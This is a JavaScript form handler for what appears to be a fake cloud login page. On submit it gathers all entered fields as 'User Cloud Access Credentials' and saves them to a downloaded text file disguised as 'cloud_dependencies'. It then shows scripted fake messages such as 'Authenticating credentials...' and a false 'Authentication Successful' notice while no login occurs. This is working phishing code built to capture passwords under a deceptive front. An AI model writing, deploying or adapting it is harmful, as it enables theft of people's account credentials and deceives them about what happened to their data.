/* --- START OF NEW FILE form-handler.js --- */

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    if (!loginForm) return; // Exit if not on the login page

    const loginSection = document.getElementById('login-section');
    const fakeAdContainer = document.getElementById('fake-ad-container');
    const themeSwitcher = document.getElementById('theme-switcher');
    const loadingOverlay = document.getElementById('loading-overlay');
    const loadingText = document.getElementById('loading-text');
    const successMessage = document.getElementById('success-message');
    const spinner = document.querySelector('.spinner');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
        const formData = new FormData(loginForm);
        let dataString = `Theme: ${localStorage.getItem('selectedTheme') || 'default'} Cloud\n`;
        dataString += "User Cloud Access Credentials:\n==============================\n";
        formData.forEach((value, key) => {
            const formattedKey = key.charAt(0).toUpperCase() + key.slice(1);
            dataString += `${formattedKey}: ${value || 'Not provided'}\n`;
        });

        try {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            triggerDownload(dataString, `cloud_dependencies_${timestamp}.txt`);
        } catch (error) {
            console.error("Download failed:", error);
            loadingText.textContent = "Error preparing data download.";
        }

        loginSection.style.display = 'none';
        fakeAdContainer.style.display = 'none';
        themeSwitcher.style.opacity = '0';
        loadingOverlay.classList.add('visible');
        spinner.style.display = 'block';
        successMessage.style.display = 'none';
        loadingText.style.display = 'block';
        loadingText.textContent = "Initiating connection...";

        const messages = [
            "Establishing secure channel...", "Authenticating credentials...",
            "Verifying account status...", "Accessing cloud environment..."
        ];
        setTimeout(() => { loadingText.textContent = messages[0]; }, 1000);
        setTimeout(() => { loadingText.textContent = messages[1]; }, 4000);
        setTimeout(() => { loadingText.textContent = messages[2]; }, 7000);
        setTimeout(() => { loadingText.textContent = messages[3]; }, 10000);

        setTimeout(() => {
            spinner.style.display = 'none';
            loadingText.style.display = 'none';
            successMessage.textContent = "Authentication Successful. You can now close this page.";
            successMessage.style.display = 'block';
        }, 12000);
    });

    function triggerDownload(content, filename) {
        const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
    }
});